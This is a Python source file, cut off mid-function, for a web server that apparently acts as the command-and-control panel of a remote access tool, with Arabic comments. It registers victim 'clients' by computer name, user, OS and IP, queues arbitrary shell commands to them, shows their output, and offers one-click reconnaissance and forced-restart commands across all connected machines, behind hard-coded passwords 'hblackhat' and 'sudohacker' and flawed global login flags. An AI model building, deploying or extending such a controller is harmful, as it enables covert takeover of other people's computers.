# server.py - Enhanced Version for Render.com
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import time
import urllib.parse
import uuid
import hashlib
import threading
import sqlite3
import os
from datetime import datetime
import socketserver

class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True

class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
    sessions = {}
    commands_queue = {}
    failed_attempts = {}
    blocked_ips = set()
    
    # 🔐 نظام الجلسات الآمن
    user_sessions = {}
    level1_authenticated = False
    level2_authenticated = False
    
    # ⚡ INSTANT PASSWORD SYSTEM
    PASSWORD_FILE = "passwords.json"
    DEFAULT_PASSWORDS = {
        "user_password": "hblackhat", 
        "admin_password": "sudohacker"
    }
    
    session_lock = threading.Lock()
    MAX_FAILED_ATTEMPTS = 5
    BLOCK_TIME = 900  # 15 دقيقة
    
    def load_passwords(self):
        """تحميل كلمات المرور"""
        try:
            if os.path.exists(self.PASSWORD_FILE):
                with open(self.PASSWORD_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return self.DEFAULT_PASSWORDS.copy()
    
    def get_password_hash(self, password_type):
        """إنشاء هاش كلمة المرور"""
        passwords = self.load_passwords()
        password = passwords.get(password_type, "")
        return hashlib.sha256(password.encode()).hexdigest()
    
    def init_database(self):
        """تهيئة قاعدة البيانات"""
        try:
            self.conn = sqlite3.connect('remote_control.db', check_same_thread=False)
            self.conn.execute('PRAGMA journal_mode=WAL')
            self.cursor = self.conn.cursor()
            
            tables = [
                '''CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    command TEXT,
                    response TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )''',
                '''CREATE TABLE IF NOT EXISTS clients (
                    id TEXT PRIMARY KEY,
                    ip TEXT,
                    computer_name TEXT,
                    os TEXT,
                    first_seen DATETIME,
                    last_seen DATETIME,
                    status TEXT
                )''',
                '''CREATE TABLE IF NOT EXISTS security_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT,
                    action TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )''',
                '''CREATE TABLE IF NOT EXISTS password_changes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    changed_by TEXT,
                    password_type TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )'''
            ]
            
            for table in tables:
                try:
                    self.cursor.execute(table)
                except:
                    pass
            self.conn.commit()
        except Exception as e:
            print(f"Database initialization error: {e}")
    
    def log_security_event(self, action):
        """تسجيل أحداث الأمان"""
        try:
            if hasattr(self, 'cursor'):
                self.cursor.execute(
                    'INSERT INTO security_logs (ip, action) VALUES (?, ?)',
                    (self.client_address[0], action)
                )
                self.conn.commit()
        except:
            pass
    
    def is_ip_blocked(self):
        """التحقق إذا كان IP محظور"""
        return self.client_address[0] in self.blocked_ips
    
    def block_ip(self, ip):
        """حظر IP"""
        self.blocked_ips.add(ip)
        self.log_security_event(f"IP Blocked: {ip}")
        print(f"🔒 BLOCKED: {ip}")
    
    def check_security(self):
        """التحقق الأمني"""
        client_ip = self.client_address[0]
        
        if self.is_ip_blocked():
            self.send_error(403, "Access Denied - IP Blocked")
            return False
        
        # ⚡ تحديد معدل الطلبات
        current_time = time.time()
        if hasattr(self, 'last_request_time'):
            if current_time - self.last_request_time < 0.1:  # خففت من 0.01 إلى 0.1
                self.block_ip(client_ip)
                return False
        
        self.last_request_time = current_time
        return True
    
    def log_message(self, format, *args):
        """تعطيل السجلات المزعجة"""
        pass
    
    def do_GET(self):
        if not self.check_security():
            return

        try:
            path = urllib.parse.urlparse(self.path).path
            
            if path == '/':
                self.send_login_page()
            
            elif path == '/admin-auth':
                if EnhancedRemoteControlHandler.level1_authenticated:
                    self.send_admin_auth_page()
                else:
                    self.send_redirect('/')
            
            elif path == '/control':
                if EnhancedRemoteControlHandler.level1_authenticated and EnhancedRemoteControlHandler.level2_authenticated:
                    self.send_control_panel()
                else:
                    self.send_redirect('/')
            
            elif path == '/sessions-data':  # 🔥 أضف هذا الـ endpoint
                self.send_sessions_list()
            
            else:
                self.send_404_page()
                
        except Exception as e:
            self.send_error(500, str(e))
    
    def do_POST(self):
        """معالجة طلبات POST"""
        if not self.check_security():
            return
            
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 10000:
                self.send_error(413, "Payload too large")
                return
                
            post_data = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(post_data) if post_data else {}
            
            routes = {
                '/login': self.handle_login,
                '/admin-login': self.handle_admin_login,
                '/execute': self.handle_execute_command,
                '/response': self.handle_client_response,
                '/register': self.handle_client_register,
                '/change-password': self.handle_change_password,
                '/logout': self.handle_logout
            }
            
            handler = routes.get(self.path, lambda x: self.send_error(404, "Not found"))
            handler(data)
                
        except Exception as e:
            self.send_json({'error': str(e)})

    def save_passwords(self, passwords):
        """حفظ كلمات المرور"""
        try:
            with open(self.PASSWORD_FILE, 'w') as f:
                json.dump(passwords, f)
            return True
        except:
            return False

    def send_login_page(self):
        """صفحة تسجيل الدخول"""
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Enhanced Remote Control - SECURE AUTH</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh;
                    margin: 0;
                }
                .container { 
                    background: rgba(45, 45, 45, 0.95); 
                    padding: 40px; 
                    border-radius: 15px; 
                    text-align: center;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                    width: 400px;
                }
                .logo { 
                    font-size: 48px; 
                    margin-bottom: 20px; 
                }
                input, button { 
                    padding: 15px; 
                    margin: 10px; 
                    width: 280px; 
                    border-radius: 8px; 
                    font-size: 16px;
                    border: none;
                    transition: all 0.2s ease;
                }
                input { 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                }
                input:focus {
                    outline: none;
                    border-color: #0078d4;
                    background: rgba(255,255,255,0.15);
                }
                input::placeholder { color: #ccc; }
                button { 
                    background: linear-gradient(135deg, #0078d4, #005a9e); 
                    color: white; 
                    border: none; 
                    cursor: pointer;
                    font-weight: bold;
                }
                button:hover {
                    background: linear-gradient(135deg, #005a9e, #004578);
                    transform: translateY(-2px);
                }
                .security-notice {
                    background: rgba(255,0,0,0.1);
                    padding: 10px;
                    border-radius: 5px;
                    margin: 10px 0;
                    border: 1px solid rgba(255,0,0,0.3);
                    display: none;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">🔒</div>
                <h2>Enhanced Remote Control</h2>
                <p style="color: #ccc; margin-bottom: 30px;">Secure System Management - Level 1 Authentication</p>
                
                <div class="security-notice" id="securityNotice">
                    Multiple failed attempts detected
                </div>
                
                <input type="password" id="password" placeholder="Enter Level 1 Password" autocomplete="off">
                <button onclick="login()">Authenticate</button>
                
                <div style="margin-top: 20px; font-size: 12px; color: #888;">
                    Multi-layer security system active
                </div>
            </div>
            <script>
                let failedAttempts = 0;
                
                function showSecurityWarning() {
                    document.getElementById('securityNotice').style.display = 'block';
                }
                
                async function login() {
                    const password = document.getElementById('password').value;
                    if (!password) {
                        alert('Please enter password');
                        return;
                    }
                    
                    try {
                        const response = await fetch('/login', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({password: password})
                        });
                        
                        const data = await response.json();
                        if (data.success) {
                            window.location = '/admin-auth';
                        } else {
                            failedAttempts++;
                            if (failedAttempts >= 2) {
                                showSecurityWarning();
                            }
                            alert('Authentication failed! Wrong password.');
                        }
                    } catch (err) {
                        alert('Connection error: ' + err);
                    }
                }
                
                document.getElementById('password').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') login();
                });
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def send_admin_auth_page(self):
        """صفحة مصادقة المدير"""
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Authentication</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
                    color: white; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh;
                    margin: 0;
                }
                .container { 
                    background: rgba(45, 45, 45, 0.95); 
                    padding: 40px; 
                    border-radius: 15px; 
                    text-align: center;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                    width: 400px;
                }
                .logo { 
                    font-size: 48px; 
                    margin-bottom: 20px; 
                }
                input, button { 
                    padding: 15px; 
                    margin: 10px; 
                    width: 280px; 
                    border-radius: 8px; 
                    font-size: 16px;
                    border: none;
                    transition: all 0.2s ease;
                }
                input { 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                }
                input:focus {
                    outline: none;
                    border-color: #e74c3c;
                }
                button { 
                    background: linear-gradient(135deg, #e74c3c, #c0392b); 
                    color: white; 
                    border: none; 
                    cursor: pointer;
                    font-weight: bold;
                }
                button:hover {
                    background: linear-gradient(135deg, #c0392b, #a93226);
                    transform: translateY(-2px);
                }
                .security-level {
                    background: rgba(231, 76, 60, 0.2);
                    padding: 10px;
                    border-radius: 5px;
                    margin: 10px 0;
                    border: 1px solid #e74c3c;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">🛡️</div>
                <h2>Admin Authentication</h2>
                <p style="color: #ccc; margin-bottom: 30px;">Level 2 Security - Administrative Access</p>
                
                <div class="security-level">
                    HIGH SECURITY LEVEL - ADMIN ACCESS REQUIRED
                </div>
                
                <input type="password" id="adminPassword" placeholder="Enter Admin Password" autocomplete="off">
                <button onclick="adminLogin()">Admin Authentication</button>
                
                <div style="margin-top: 20px; font-size: 12px; color: #888;">
                    Unauthorized access will be logged and blocked
                </div>
            </div>
            <script>
                async function adminLogin() {
                    const password = document.getElementById('adminPassword').value;
                    if (!password) {
                        alert('Please enter admin password');
                        return;
                    }
                    
                    try {
                        const response = await fetch('/admin-login', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({password: password})
                        });
                        
                        const data = await response.json();
                        if (data.success) {
                            window.location = '/control';
                        } else {
                            alert('Admin authentication failed! Access denied.');
                        }
                    } catch (err) {
                        alert('Connection error: ' + err);
                    }
                }
                
                document.getElementById('adminPassword').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') adminLogin();
                });
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def send_control_panel(self):
        """لوحة التحكم المتكاملة"""
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Secure Control Panel</title>
            <style>
                :root {
                    --primary: #0078d4;
                    --success: #28a745;
                    --danger: #dc3545;
                    --warning: #ffc107;
                    --info: #17a2b8;
                    --dark: #1e1e1e;
                    --darker: #2d2d2d;
                    --light: #f8f9fa;
                }
                
                * { margin: 0; padding: 0; box-sizing: border-box; }
                
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: var(--dark); 
                    color: var(--light); 
                    margin: 0; 
                    padding: 20px;
                    overflow-x: hidden;
                }
                
                .header {
                    background: var(--darker);
                    padding: 20px;
                    border-radius: 10px;
                    margin-bottom: 20px;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                
                .tabs {
                    display: flex;
                    background: var(--darker);
                    border-radius: 10px;
                    padding: 5px;
                    margin-bottom: 20px;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                
                .tab {
                    flex: 1;
                    padding: 15px;
                    text-align: center;
                    cursor: pointer;
                    border-radius: 8px;
                    transition: all 0.3s ease;
                    font-weight: 500;
                }
                
                .tab.active {
                    background: var(--primary);
                    font-weight: bold;
                }
                
                .tab:hover:not(.active) {
                    background: rgba(255,255,255,0.1);
                }
                
                .tab-content {
                    display: none;
                }
                
                .tab-content.active {
                    display: block;
                }
                
                .container { 
                    display: grid; 
                    grid-template-columns: 350px 1fr; 
                    gap: 20px; 
                    height: 80vh; 
                }
                
                .sidebar { 
                    background: var(--darker); 
                    padding: 20px; 
                    border-radius: 10px;
                    display: flex;
                    flex-direction: column;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                
                .main { 
                    display: flex; 
                    flex-direction: column;
                    gap: 20px;
                }
                
                .session-item { 
                    background: rgba(255,255,255,0.05); 
                    padding: 15px; 
                    margin: 8px 0; 
                    border-radius: 8px; 
                    cursor: pointer;
                    border: 2px solid transparent;
                    transition: all 0.2s ease;
                    position: relative;
                }
                
                .session-item:hover {
                    background: rgba(255,255,255,0.1);
                    border-color: var(--primary);
                    transform: translateY(-1px);
                }
                
                .session-item.active { 
                    border: 2px solid var(--success);
                    background: rgba(40, 167, 69, 0.1);
                }
                
                .online-status {
                    position: absolute;
                    top: 10px;
                    right: 10px;
                    width: 12px;
                    height: 12px;
                    border-radius: 50%;
                    background: var(--success);
                    animation: pulse 2s infinite;
                }
                
                .online-status.offline {
                    background: var(--danger);
                    animation: none;
                }
                
                @keyframes pulse {
                    0% { opacity: 1; }
                    50% { opacity: 0.5; }
                    100% { opacity: 1; }
                }
                
                .terminal { 
                    background: #000; 
                    color: #00ff00; 
                    padding: 20px; 
                    border-radius: 8px; 
                    font-family: 'Consolas', monospace; 
                    flex: 1; 
                    overflow-y: auto; 
                    white-space: pre-wrap;
                    font-size: 14px;
                    min-height: 300px;
                    border: 1px solid rgba(0,255,0,0.2);
                }
                
                button { 
                    background: var(--primary); 
                    color: white; 
                    border: none; 
                    padding: 12px 16px; 
                    margin: 4px; 
                    border-radius: 6px; 
                    cursor: pointer;
                    transition: all 0.2s ease;
                    font-weight: 500;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                
                button:hover {
                    transform: translateY(-2px);
                    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
                }
                
                button.danger { 
                    background: var(--danger); 
                }
                
                button.success { 
                    background: var(--success); 
                }
                
                button.warning { 
                    background: var(--warning); 
                    color: #000; 
                }
                
                .controls-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
                    gap: 8px;
                    margin: 15px 0;
                }
                
                .command-input { 
                    display: flex; 
                    margin: 15px 0; 
                    gap: 10px;
                }
                
                .command-input input { 
                    flex: 1; 
                    padding: 12px; 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                    border-radius: 6px;
                    font-family: 'Consolas', monospace;
                }
                
                .command-input input:focus {
                    outline: none;
                    border-color: var(--primary);
                    background: rgba(255,255,255,0.15);
                }
                
                .stats {
                    display: grid;
                    grid-template-columns: repeat(3, 1fr);
                    gap: 10px;
                    margin: 15px 0;
                }
                
                .stat-card {
                    background: var(--darker);
                    padding: 15px;
                    border-radius: 8px;
                    text-align: center;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                
                .settings-container {
                    background: var(--darker);
                    padding: 30px;
                    border-radius: 15px;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                
                .password-form {
                    background: rgba(255,255,255,0.05);
                    padding: 20px;
                    border-radius: 10px;
                    margin: 20px 0;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                
                input, select {
                    width: 100%;
                    padding: 12px;
                    margin: 8px 0;
                    border-radius: 6px;
                    border: none;
                    font-size: 16px;
                    transition: all 0.2s ease;
                    background: rgba(255,255,255,0.1);
                    color: white;
                    border: 1px solid rgba(255,255,255,0.2);
                }
                
                input:focus {
                    outline: none;
                    border-color: var(--primary);
                    background: rgba(255,255,255,0.15);
                }
                
                .message {
                    padding: 12px;
                    border-radius: 6px;
                    margin: 10px 0;
                    text-align: center;
                    display: none;
                    font-weight: bold;
                }
                
                .success { background: rgba(40, 167, 69, 0.2); border: 1px solid #28a745; }
                .error { background: rgba(220, 53, 69, 0.2); border: 1px solid #dc3545; }
            </style>
        </head>
        <body>
            <div class="header">
                <h2>🔒 Secure Remote Control System</h2>
                <div>
                    <button class="warning" onclick="logout()">🚪 Logout</button>
                </div>
            </div>
            
            <div class="tabs">
                <div class="tab active" onclick="switchTab('control')">🎮 Control Panel</div>
                <div class="tab" onclick="switchTab('sessions')">👥 Connected Clients</div>
                <div class="tab" onclick="switchTab('settings')">⚙️ Security Settings</div>
            </div>
            
            <!-- تبويب التحكم -->
            <div id="control-tab" class="tab-content active">
                <div class="container">
                    <div class="sidebar">
                        <h3>Connected Clients (<span id="clientsCount">0</span>)</h3>
                        <div id="sessionsList" style="flex: 1; overflow-y: auto; max-height: 500px;">
                            <div style="text-align: center; color: #666; padding: 20px;">
                                Loading clients...
                            </div>
                        </div>
                        
                        <div class="stats">
                            <div class="stat-card">
                                <div style="font-size: 24px; font-weight: bold; color: var(--primary)" id="totalClients">0</div>
                                <small>Total Clients</small>
                            </div>
                            <div class="stat-card">
                                <div style="font-size: 24px; font-weight: bold; color: var(--success)" id="activeClients">0</div>
                                <small>Active</small>
                            </div>
                            <div class="stat-card">
                                <div style="font-size: 24px; font-weight: bold; color: var(--warning)" id="commandsSent">0</div>
                                <small>Commands</small>
                            </div>
                        </div>
                    </div>
                    
                    <div class="main">
                        <div style="background: var(--darker); padding: 20px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.1);">
                            <h3>Selected Client: <span id="currentClient" style="color: var(--success); font-weight: bold;">Not Selected</span></h3>
                            
                            <div style="display: flex; gap: 10px; margin: 15px 0;">
                                <button onclick="executeCommand('systeminfo')">System Info</button>
                                <button onclick="executeCommand('whoami')">Current User</button>
                                <button onclick="executeCommand('ipconfig')">Network Info</button>
                                <button class="danger" onclick="executeCommand('shutdown /r /t 30')">Restart</button>
                            </div>
                            
                            <div class="command-input">
                                <input type="text" id="commandInput" placeholder="Enter custom command..." 
                                       onkeypress="if(event.key=='Enter') executeCustomCommand()">
                                <button onclick="executeCustomCommand()">Execute</button>
                            </div>
                        </div>
                        
                        <div class="terminal" id="terminal">
    🔒 SECURE REMOTE CONTROL SYSTEM READY
    
    • Select a client from the left panel
    • Enter commands in the input field
    • All activities are logged for security
    • Multi-layer authentication active
    • Real-time monitoring enabled
    
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- تبويب الجلسات -->
            <div id="sessions-tab" class="tab-content">
                <div style="background: var(--darker); padding: 30px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.1);">
                    <h3>Connected Clients Management</h3>
                    <div style="display: flex; gap: 10px; margin: 20px 0;">
                        <button onclick="loadSessions()">🔄 Refresh List</button>
                        <button class="success" onclick="executeAll('systeminfo')">📊 System Info All</button>
                        <button class="warning" onclick="executeAll('whoami')">👤 Users Info All</button>
                    </div>
                    <div id="detailedSessionsList">
                        Loading detailed sessions...
                    </div>
                </div>
            </div>
            
            <!-- تبويب الإعدادات -->
            <div id="settings-tab" class="tab-content">
                <div class="settings-container">
                    <h3>🔐 Security Settings</h3>
                    <p style="color: #ccc; margin-bottom: 30px;">Change authentication passwords securely</p>
                    
                    <div id="settings-message" class="message"></div>
                    
                    <div class="password-form">
                        <h4>Change Level 1 Password</h4>
                        <input type="password" id="currentPassword1" placeholder="Current Level 1 Password">
                        <input type="password" id="newPassword1" placeholder="New Level 1 Password">
                        <input type="password" id="confirmPassword1" placeholder="Confirm New Password">
                        <button onclick="changePassword('level1')">Update Level 1 Password</button>
                    </div>
                    
                    <div class="password-form">
                        <h4>Change Admin Password</h4>
                        <input type="password" id="currentPassword2" placeholder="Current Admin Password">
                        <input type="password" id="newPassword2" placeholder="New Admin Password">
                        <input type="password" id="confirmPassword2" placeholder="Confirm New Password">
                        <button onclick="changePassword('level2')">Update Admin Password</button>
                    </div>
                </div>
            </div>
            
            <script>
                let currentClientId = null;
                let commandCounter = 0;
                let allClients = [];
                
                function switchTab(tabName) {
                    document.querySelectorAll('.tab-content').forEach(content => {
                        content.classList.remove('active');
                    });
                    document.querySelectorAll('.tab').forEach(tab => {
                        tab.classList.remove('active');
                    });
                    
                    document.getElementById(tabName + '-tab').classList.add('active');
                    document.querySelector(`.tab:nth-child(${tabName === 'control' ? 1 : tabName === 'sessions' ? 2 : 3})`).classList.add('active');
                    
                    if (tabName === 'sessions') {
                        loadDetailedSessions();
                    }
                }
                
                async function loadSessions() {
                    try {
                        const response = await fetch('/sessions-data');
                        const sessions = await response.json();
                        allClients = sessions;
                        updateSessionStats(sessions);
                        
                        const list = document.getElementById('sessionsList');
                        if (sessions.length === 0) {
                            list.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">No clients connected</div>';
                            return;
                        }
                        
                        list.innerHTML = sessions.map(client => {
                            const lastSeen = new Date(client.last_seen).getTime();
                            const now = Date.now();
                            const timeDiff = (now - lastSeen) / 1000;
                            
                            let isOnline = timeDiff < 120;
                            let statusClass = isOnline ? 'online-status' : 'online-status offline';
                            let statusColor = isOnline ? '#28a745' : '#dc3545';
                            
                            const isSelected = client.id === currentClientId;
                            
                            let timeDisplay = '';
                            if (timeDiff < 60) timeDisplay = `${Math.floor(timeDiff)}s ago`;
                            else if (timeDiff < 3600) timeDisplay = `${Math.floor(timeDiff / 60)}m ago`;
                            else timeDisplay = `${Math.floor(timeDiff / 3600)}h ago`;
                            
                            return `
                                <div class="session-item ${isSelected ? 'active' : ''} ${!isOnline ? 'offline' : ''}" 
                                     onclick="selectClient('${client.id}')">
                                    <div class="${statusClass}"></div>
                                    <strong style="color: ${statusColor}">${client.computer || client.id}</strong><br>
                                    <small>User: ${client.user || 'Unknown'}</small><br>
                                    <small>OS: ${client.os || 'Unknown'}</small><br>
                                    <small>IP: ${client.ip}</small><br>
                                    <small>Last: ${timeDisplay}</small>
                                </div>
                            `;
                        }).join('');
                    } catch (error) {
                        console.error('Error loading sessions:', error);
                    }
                }
                
                async function loadDetailedSessions() {
                    try {
                        const response = await fetch('/sessions-data');
                        const sessions = await response.json();
                        
                        const list = document.getElementById('detailedSessionsList');
                        if (sessions.length === 0) {
                            list.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">No clients connected</div>';
                            return;
                        }
                        
                        list.innerHTML = sessions.map(client => {
                            const lastSeen = new Date(client.last_seen);
                            const isOnline = (Date.now() - lastSeen.getTime()) < 120000;
                            
                            return `
                                <div class="session-item" style="margin: 10px 0;">
                                    <strong>${client.computer || client.id}</strong><br>
                                    <small>User: ${client.user || 'Unknown'} | OS: ${client.os || 'Unknown'}</small><br>
                                    <small>IP: ${client.ip} | Last Seen: ${lastSeen.toLocaleString()}</small><br>
                                    <small style="color: ${isOnline ? '#28a745' : '#dc3545'}">
                                        ${isOnline ? '🟢 ONLINE' : '🔴 OFFLINE'}
                                    </small>
                                    <button onclick="selectClient('${client.id}'); switchTab('control');" style="margin-top: 5px;">Select</button>
                                </div>
                            `;
                        }).join('');
                    } catch (error) {
                        console.error('Error loading detailed sessions:', error);
                    }
                }
                
                function updateSessionStats(sessions) {
                    const total = sessions.length;
                    const active = sessions.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 120000).length;
                    
                    document.getElementById('totalClients').textContent = total;
                    document.getElementById('activeClients').textContent = active;
                    document.getElementById('commandsSent').textContent = commandCounter;
                    document.getElementById('clientsCount').textContent = total;
                }
                
                function selectClient(clientId) {
                    currentClientId = clientId;
                    loadSessions();
                    document.getElementById('currentClient').textContent = clientId;
                    addToTerminal(`Selected client: ${clientId}\\n`);
                }
                
                function executeCommand(command) {
                    if (!currentClientId) {
                        alert('Please select a client first!');
                        return;
                    }
                    executeSingleCommand(currentClientId, command);
                }
                
                async function executeSingleCommand(clientId, command) {
                    commandCounter++;
                    const startTime = Date.now();
                    addToTerminal(` [${clientId}] ${command}\\n`);
                    
                    try {
                        const response = await fetch('/execute', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({client_id: clientId, command: command})
                        });
                        
                        const data = await response.json();
                        if (data.success) {
                            addToTerminal(`Command sent successfully\\n`);
                            waitForResult(clientId, command, startTime);
                        } else {
                            addToTerminal(`Error: ${data.error}\\n`);
                        }
                    } catch (err) {
                        addToTerminal(` Network error: ${err}\\n`);
                    }
                }
                
                function executeAll(command) {
                    if (allClients.length === 0) {
                        alert('No clients connected!');
                        return;
                    }
                    
                    const activeClients = allClients.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 300000);
                    if (activeClients.length === 0) {
                        alert('No active clients!');
                        return;
                    }
                    
                    addToTerminal(`Executing command on ${activeClients.length} clients: ${command}\\n`);
                    
                    activeClients.forEach(client => {
                        executeSingleCommand(client.id, command);
                    });
                }
                
                function executeCustomCommand() {
                    const cmd = document.getElementById('commandInput').value.trim();
                    if (cmd) {
                        executeCommand(cmd);
                        document.getElementById('commandInput').value = '';
                    } else {
                        alert('Please enter a command');
                    }
                }
                
                function waitForResult(clientId, command, startTime) {
                    let attempts = 0;
                    const maxAttempts = 50;
                    
                    const checkResult = async () => {
                        attempts++;
                        if (attempts > maxAttempts) {
                            addToTerminal(`Timeout: No response from ${clientId}\\n`);
                            return;
                        }
                        
                        try {
                            const response = await fetch('/result?client=' + clientId + '&_t=' + Date.now());
                            const data = await response.json();
                            
                            if (data.result) {
                                const responseTime = Date.now() - startTime;
                                addToTerminal(` [${clientId}] Response (${responseTime}ms):\\n${data.result}\\n`);
                            } else {
                                setTimeout(checkResult, 100);
                            }
                        } catch {
                            setTimeout(checkResult, 100);
                        }
                    };
                    checkResult();
                }
                
                function addToTerminal(text) {
                    const terminal = document.getElementById('terminal');
                    terminal.textContent += text;
                    terminal.scrollTop = terminal.scrollHeight;
                }
                
                function showMessage(text, type) {
                    const message = document.getElementById('settings-message');
                    message.textContent = text;
                    message.className = 'message ' + type;
                    message.style.display = 'block';
                    setTimeout(() => {
                        message.style.display = 'none';
                    }, 3000);
                }
                
                async function changePassword(level) {
                    let currentId, newId, confirmId;
                    
                    if (level === 'level1') {
                        currentId = 'currentPassword1';
                        newId = 'newPassword1';
                        confirmId = 'confirmPassword1';
                    } else {
                        currentId = 'currentPassword2';
                        newId = 'newPassword2';
                        confirmId = 'confirmPassword2';
                    }
                    
                    const currentPassword = document.getElementById(currentId).value;
                    const newPassword = document.getElementById(newId).value;
                    const confirmPassword = document.getElementById(confirmId).value;
                    
                    if (!currentPassword || !newPassword || !confirmPassword) {
                        showMessage('Please fill all fields', 'error');
                        return;
                    }
                    
                    if (newPassword !== confirmPassword) {
                        showMessage('New passwords do not match', 'error');
                        return;
                    }
                    
                    if (newPassword.length < 4) {
                        showMessage('Password must be at least 4 characters', 'error');
                        return;
                    }
                    
                    try {
                        const response = await fetch('/change-password', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                level: level,
                                current_password: currentPassword,
                                new_password: newPassword
                            })
                        });
                        
                        const data = await response.json();
                        if (data.success) {
                            showMessage('Password updated successfully!', 'success');
                            document.getElementById(currentId).value = '';
                            document.getElementById(newId).value = '';
                            document.getElementById(confirmId).value = '';
                        } else {
                            showMessage(data.error || 'Failed to update password', 'error');
                        }
                    } catch (err) {
                        showMessage('Network error: ' + err, 'error');
                    }
                }
                
                async function logout() {
                    if (confirm('Are you sure you want to logout?')) {
                        try {
                            const response = await fetch('/logout', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({})
                            });
                            
                            window.location = '/';
                        } catch (err) {
                            window.location = '/';
                        }
                    }
                }
                
                // التحديث التلقائي
                setInterval(loadSessions, 5000);
                loadSessions();
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def handle_login(self, data):
        client_ip = self.client_address[0]
        password = data.get('password', '')
        expected_hash = self.get_password_hash("user_password")
        
        if hashlib.sha256(password.encode()).hexdigest() == expected_hash:
            EnhancedRemoteControlHandler.level1_authenticated = True
            self.send_json({'success': True})
        else:
            if client_ip not in self.failed_attempts:
                self.failed_attempts[client_ip] = {'count': 0, 'last_attempt': time.time()}
            
            self.failed_attempts[client_ip]['count'] += 1
            self.failed_attempts[client_ip]['last_attempt'] = time.time()
            
            self.log_security_event(f"Failed level 1 authentication - Attempt {self.failed_attempts[client_ip]['count']}")
            
            if self.failed_attempts[client_ip]['count'] >= self.MAX_FAILED_ATTEMPTS:
                self.block_ip(client_ip)
            
            self.send_json({'success': False})
    
    def handle_admin_login(self, data):
        client_ip = self.client_address[0]
        password = data.get('password', '')
        expected_hash = self.get_password_hash("admin_password")
        
        if hashlib.sha256(password.encode()).hexdigest() == expected_hash:
            EnhancedRemoteControlHandler.level2_authenticated = True
            self.send_json({'success': True})
        else:
            self.log_security_event("Failed admin authentication")
            self.send_json({'success': False})

    def handle_change_password(self, data):
        """تغيير كلمة المرور"""
        level = data.get('level')
        current_password = data.get('current_password')
        new_password = data.get('new_password')
        
        if not level or not current_password or not new_password:
            self.send_json({'success': False, 'error': 'Missing required fields'})
            return
        
        passwords = self.load_passwords()
        
        if level == 'level1':
            current_hash = hashlib.sha256(current_password.encode()).hexdigest()
            expected_hash = hashlib.sha256(passwords['user_password'].encode()).hexdigest()
            
            if current_hash != expected_hash:
                self.send_json({'success': False, 'error': 'Current Level 1 password is incorrect'})
                return
            
            passwords['user_password'] = new_password
            
        elif level == 'level2':
